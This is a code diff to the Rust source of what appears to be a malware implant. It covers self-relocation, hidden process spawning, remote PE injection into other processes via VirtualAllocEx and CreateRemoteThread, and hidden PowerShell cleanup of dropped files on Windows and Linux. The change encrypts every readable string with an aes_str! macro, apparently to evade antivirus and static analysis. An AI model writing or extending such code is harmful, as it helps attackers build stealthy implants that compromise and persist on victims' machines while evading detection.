@@ -18,8 +18,8 @@ use strcrypt::aes_str;
 /// Read the current agent binary from disk.
 /// Falls back to reading /proc/self/exe on Linux.
 pub fn read_self() -> Result<Vec<u8>, String> {
-    let exe = std::env::current_exe().map_err(|e| format!("current_exe: {}", e))?;
-    fs::read(&exe).map_err(|e| format!("Read self ({}): {}", exe.display(), e))
+    let exe = std::env::current_exe().map_err(|e| format!("{}: {}", aes_str!("current_exe"), e))?;
+    fs::read(&exe).map_err(|e| format!("{} ({}): {}", aes_str!("Read self"), exe.display(), e))
 }
 
 // ── Windows Implementation ─────────────────────────────────────────────
@@ -225,7 +225,7 @@ pub mod windows {
         let temp_dir = std::env::temp_dir();
         let temp_name = random_temp_name(&aes_str!("svc_"), &aes_str!("exe"));
         let temp_path = temp_dir.join(&temp_name);
-        fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write temp: {}", e))?;
+        fs::write(&temp_path, pe_bytes).map_err(|e| format!("{}: {}", aes_str!("Write temp"), e))?;
 
         // RAII guard: securely overwrites and deletes the temp file on drop.
         // Only effective if CreateProcessA FAILS - if it succeeds, the new
@@ -245,7 +245,7 @@ pub mod windows {
             0, CREATE_NO_WINDOW, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi,
         ) == 0 {
             // guard drops here -> securely deletes (file isn't locked)
-            return Err(format!("CreateProcess failed: {}", GetLastError()));
+            return Err(format!("{}: {}", aes_str!("CreateProcess failed"), GetLastError()));
         }
 
         let pid = pi.dw_process_id;
@@ -285,12 +285,10 @@ pub mod windows {
                 // retry until the process exits or reboot.
                 let path_escaped = temp_path.to_string_lossy().replace('\'', "''");
                 let ps_cmd = format!(
-                    "Start-Sleep -Seconds 60; \
-                     for ($i=0; $i -lt 10; $i++) {{ \
-                       try {{ Remove-Item -Path '{}' -Force -ErrorAction Stop; break }} \
-                       catch {{ Start-Sleep -Seconds 30 }} \
-                     }}",
-                    path_escaped
+                    "{} '{}' {}",
+                    aes_str!("Start-Sleep -Seconds 60; for ($i=0; $i -lt 10; $i++) { try { Remove-Item -Path"),
+                    path_escaped,
+                    aes_str!("-Force -ErrorAction Stop; break } catch { Start-Sleep -Seconds 30 } }")
                 );
                 let _ = std::process::Command::new(aes_str!("powershell"))
                     .args([aes_str!("-NoProfile"), aes_str!("-WindowStyle"), aes_str!("Hidden"), aes_str!("-Command"), ps_cmd])
@@ -302,7 +300,7 @@ pub mod windows {
         // (it would fail and leave misleading retry-backoff delays)
         std::mem::forget(guard);
 
-        Ok(format!("Spawned new process PID {}", pid))
+        Ok(format!("{} {}", aes_str!("Spawned new process PID"), pid))
     }
 
     /// Inject the agent PE into an existing process.
@@ -314,12 +312,12 @@ pub mod windows {
         let h_process = OpenProcess(
             crate::config::config().ffi_windows.process_all_access, 0, pid);
         if h_process.is_null() {
-            return Err(format!("OpenProcess({}) failed: {}", pid, GetLastError()));
+            return Err(format!("{}({}) {}: {}", aes_str!("OpenProcess"), pid, aes_str!("failed"), GetLastError()));
         }
 
         let result = inject_pe_into_process(h_process, pe_bytes);
         CloseHandle(h_process);
-        result.map(|_| format!("Migrated into PID {}", pid))
+        result.map(|_| format!("{} {}", aes_str!("Migrated into PID"), pid))
     }
 
     /// Inject into an existing process via remote PE mapping.
@@ -379,7 +377,7 @@ pub mod windows {
             );
         }
         if remote_base.is_null() {
-            return Err(format!("VirtualAllocEx failed: {}", GetLastError()));
+            return Err(format!("{}: {}", aes_str!("VirtualAllocEx failed"), GetLastError()));
         }
 
         let delta = remote_base as i64 - image_base as i64;
@@ -524,7 +522,7 @@ pub mod windows {
         let entry = (remote_base as usize + entry_rva) as *const c_void;
         let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, entry, remote_base, 0, ptr::null_mut());
         if h_thread.is_null() {
-            return Err(format!("CreateRemoteThread failed: {}", GetLastError()));
+            return Err(format!("{}: {}", aes_str!("CreateRemoteThread failed"), GetLastError()));
         }
         CloseHandle(h_thread);
 
@@ -555,13 +553,13 @@ pub mod linux {
         let temp_name = random_temp_name(&aes_str!("."), &aes_str!("dll"));
         let temp_path = temp_dir.join(&temp_name);
 
-        fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write: {}", e))?;
+        fs::write(&temp_path, pe_bytes).map_err(|e| format!("{}: {}", aes_str!("Write"), e))?;
         fs::set_permissions(&temp_path, fs::Permissions::from_mode(0o755))
-            .map_err(|e| format!("Chmod: {}", e))?;
+            .map_err(|e| format!("{}: {}", aes_str!("Chmod"), e))?;
 
         let child = Command::new(&temp_path)
             .spawn()
-            .map_err(|e| format!("Spawn: {}", e))?;
+            .map_err(|e| format!("{}: {}", aes_str!("Spawn"), e))?;
 
         let pid = child.id();
         let path_display = temp_path.display().to_string();
@@ -572,7 +570,7 @@ pub mod linux {
             let _ = fs::remove_file(&temp_path);
         });
 
-        Ok(format!("Migrated to PID {} ({})", pid, path_display))
+        Ok(format!("{} {} ({})", aes_str!("Migrated to PID"), pid, path_display))
     }
 }
 
